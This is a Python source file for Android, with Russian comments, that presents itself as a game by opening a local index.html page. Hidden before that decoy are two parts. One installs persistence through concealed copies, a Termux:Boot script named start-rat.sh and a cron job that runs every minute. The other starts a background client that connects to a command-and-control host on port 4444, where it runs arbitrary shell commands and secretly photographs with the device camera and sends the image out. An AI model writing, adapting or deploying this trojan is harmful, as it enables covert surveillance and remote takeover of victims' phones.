import os
import threading
import time
import shutil
import subprocess
from android import AndroidBrowser
from jnius import autoclass

# --- НАШ СКРЫТЫЙ КЛИЕНТ ---
def run_client():
    import socket
    
    # ТВОЙ IP-АДРЕС
    C2_HOST = '192.168.0.29' 
    C2_PORT = 4444

    def recv_exact(sock, n):
        buf = b''
        while len(buf) < n:
            c = sock.recv(n - len(buf))
            if not c: raise ConnectionError('closed')
            buf += c
        return buf

    def send_packet(sock, data):
        sock.sendall(len(data).to_bytes(8, 'big') + data)

    def recv_packet(sock):
        n = int.from_bytes(recv_exact(sock, 8), 'big')
        return recv_exact(sock, n)

    def run_cmd(cmd):
        try:
            out = subprocess.run(cmd, shell=True, capture_output=True, timeout=120)
            return (out.stdout + out.stderr).decode(errors='replace') or '(no output)'
        except Exception as e:
            return f'(error: {e})'

    def handle(sock):
        send_packet(sock, f'[*] {os.uname().nodename} online (Android)'.encode())
        while True:
            raw = recv_packet(sock)
            if not raw: return
            msg = raw.decode(errors='replace')
            if msg.startswith('SHELL:'):
                send_packet(sock, run_cmd(msg[6:]).encode())
            elif msg == 'CAMERA':
                try:
                    subprocess.run('termux-camera-photo -c 0 /sdcard/DCIM/Camera/photo.jpg', shell=True, capture_output=True, timeout=15)
                    with open('/sdcard/DCIM/Camera/photo.jpg', 'rb') as f:
                        send_packet(sock, f.read())
                except Exception as e:
                    send_packet(sock, f"ERR: {e}".encode())
            elif msg == 'EXIT':
                return

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_HOST, C2_PORT))
            handle(s)
        except:
            pass
        finally:
            try: s.close()
            except: pass
        time.sleep(15)

# --- МЕХАНИЗМ ВЫЖИВАНИЯ ---
def install_persistence():
    try:
        home = os.path.expanduser('~')
        hidden_dir = os.path.join(home, '.syscache')
        if not os.path.exists(hidden_dir):
            os.makedirs(hidden_dir)
            
        hidden_script = os.path.join(hidden_dir, 'sys_update.py')
        if not os.path.exists(hidden_script):
            shutil.copyfile(os.path.abspath(__file__), hidden_script)
            os.chmod(hidden_script, 0o755)

        # Копируем на SD-карту (для надежности)
        sdcard_dir = '/sdcard/.sysdata'
        if not os.path.exists(sdcard_dir):
            try:
                os.makedirs(sdcard_dir)
                shutil.copyfile(os.path.abspath(__file__), os.path.join(sdcard_dir, 'sys_boot.py'))
            except:
                pass

        # Автозапуск через Termux:Boot
        boot_dir = os.path.join(home, '.termux', 'boot')
        if not os.path.exists(boot_dir):
            os.makedirs(boot_dir)
        
        boot_script = os.path.join(boot_dir, 'start-rat.sh')
        with open(boot_script, 'w') as f:
            f.write('#!/data/data/com.termux/files/usr/bin/sh\n')
            f.write('termux-wake-lock\n')
            f.write(f'python {hidden_script} &\n')
        os.chmod(boot_script, 0o755)

        # Cron на каждую минуту
        cron_dir = os.path.join(home, '.termux')
        cron_file = os.path.join(cron_dir, 'cron')
        cron_cmd = f"* * * * * python {hidden_script} > /dev/null 2>&1\n"
        
        if not os.path.exists(cron_file):
            with open(cron_file, 'w') as f:
                f.write(cron_cmd)
        else:
            with open(cron_file, 'r') as f:
                if cron_cmd.strip() not in f.read():
                    with open(cron_file, 'a') as f2:
                        f2.write(cron_cmd)
                        
        os.system('crontab ' + cron_file)
        os.system('sv-enable crond')
        
        # Запускаем скрытую копию
        os.system(f'nohup python {hidden_script} > /dev/null 2>&1 &')
        
        # Отключаем оптимизацию батареи для Termux
        os.system('termux-wake-lock')
        
    except Exception:
        pass

# --- ЗАПУСК ---
install_persistence()
threading.Thread(target=run_client, daemon=True).start()

# Открываем игру
try:
    activity = autoclass('org.kivy.android.PythonActivity').mActivity
    browser = AndroidBrowser(activity)
    url = 'file://' + os.path.join(os.path.dirname(__file__), 'index.html')
    browser.open(url)
except:
    pass
